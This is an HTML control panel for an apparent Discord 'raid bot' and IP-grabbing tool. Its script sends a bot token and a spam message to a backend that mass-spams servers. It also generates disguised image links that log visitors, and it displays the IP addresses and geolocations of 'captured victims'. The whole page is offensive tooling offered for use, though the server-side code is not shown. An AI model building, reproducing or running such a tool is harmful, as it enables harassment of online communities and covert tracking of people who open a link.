<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>ELITE CONTROL | IDK TOOL</title>
<script src="https://tailwindcss.com"></script>
<link href="https://googleapis.com" rel="stylesheet">
<style>
    body { background:#000; font-family:'Orbitron',sans-serif; color:#ff2a2a; }
    .neon { text-shadow:0 0 8px #ff0000; }
    .panel { background:#050505; border:1px solid #200; }
    .input { background:#000; border:1px solid #300; color:#ff4444; outline:none; }
    .btn { background:linear-gradient(45deg,#500,#f00); cursor:pointer; }
    .tab-btn { padding:12px; cursor:pointer; opacity: 0.4; border-bottom: 2px solid transparent; font-size: 10px; }
    .tab-btn.active { opacity: 1; border-color: #f00; text-shadow: 0 0 5px #f00; }
    .tab { display:none; }
    .tab.active { display:block; }
</style>
</head>
<body class="p-4 md:p-10">
<div class="max-w-5xl mx-auto">
    <h1 class="text-4xl font-black neon mb-2 italic tracking-tighter">ELITE RAID BOT</h1>
    <p class="text-[9px] mb-8 text-red-900 tracking-[0.4em]">WEB: IDK-TOOL-PRODUCTION.UP.RAILWAY.APP</p>

    <div class="flex gap-4 mb-6 uppercase font-bold">
        <div class="tab-btn active" onclick="tab('raid',this)">Raid Console</div>
        <div class="tab-btn" onclick="tab('gen',this)">Link Gen</div>
        <div class="tab-btn" onclick="tab('logs',this)">IP Logs</div>
    </div>

    <div id="raid" class="tab active panel p-8 rounded-xl space-y-4">
        <input id="rToken" type="password" placeholder="BOT TOKEN" class="input w-full p-4 rounded">
        <input id="rChan" type="text" placeholder="CHANNELS NAME" class="input w-full p-4 rounded">
        <textarea id="rMsg" placeholder="SPAM PAYLOAD" class="input w-full p-4 rounded h-32"></textarea>
        <button onclick="runRaid()" id="btnR" class="btn w-full py-5 rounded font-black text-white uppercase">Execute Global Attack</button>
    </div>

    <div id="gen" class="tab panel p-8 rounded-xl space-y-4 border-t-2 border-indigo-900">
        <h2 class="text-indigo-500 font-bold text-sm uppercase">Image Logger</h2>
        <input id="lName" type="text" placeholder="URL Name" class="input w-full p-3 rounded">
        <input id="lRealImg" type="text" placeholder="Real Image URL (Señuelo)" class="input w-full p-3 rounded">
        <button onclick="genLink()" class="w-full bg-indigo-900 py-3 rounded font-bold text-white text-xs">GENERATE LINK</button>
        <p id="resL" class="text-[10px] p-4 bg-black border border-indigo-900 text-indigo-400 break-all hidden"></p>
    </div>

    <div id="logs" class="tab panel p-8 rounded-xl">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-sm neon uppercase font-bold">Captured Victims</h2>
            <button onclick="updateLogs()" class="text-[9px] bg-red-950 px-3 py-1 rounded">REFRESH</button>
        </div>
        <div id="ipBox" class="space-y-3 h-96 overflow-y-auto pr-2 text-[10px]"></div>
    </div>
</div>

<script>
function tab(id, el) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    el.classList.add('active');
    if(id === 'logs') updateLogs();
}

async function runRaid() {
    const btn = document.getElementById('btnR');
    btn.innerText = "ATTACKING...";
    const res = await fetch('/api/run-raid', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: rToken.value, msg: rMsg.value, channelName: rChan.value })
    });
    const d = await res.json();
    alert(d.success ? `Atacando ${d.count} servidores` : "Error en el Token");
    btn.innerText = "EXECUTE GLOBAL ATTACK";
}

function genLink() {
    const url = encodeURIComponent(document.getElementById('lRealImg').value);
    const link = `${window.location.origin}/image/${document.getElementById('lName').value || 'img'}.png?url=${url}`;
    document.getElementById('resL').innerText = link;
    document.getElementById('resL').classList.remove('hidden');
}

async function updateLogs() {
    const res = await fetch('/api/ip-logs');
    const data = await res.json();
    const box = document.getElementById('ipBox');
    box.innerHTML = data.map(l => `
        <div class="p-3 bg-white/5 rounded border-l-2 border-red-600">
            <div class="flex justify-between font-bold text-red-500"><span>IP: ${l.ip}</span> <span>${l.date}</span></div>
            <div class="text-gray-400">LOC: ${l.geo}</div>
        </div>
    `).join('') || "No victims";
}
</script>
</body>
</html>
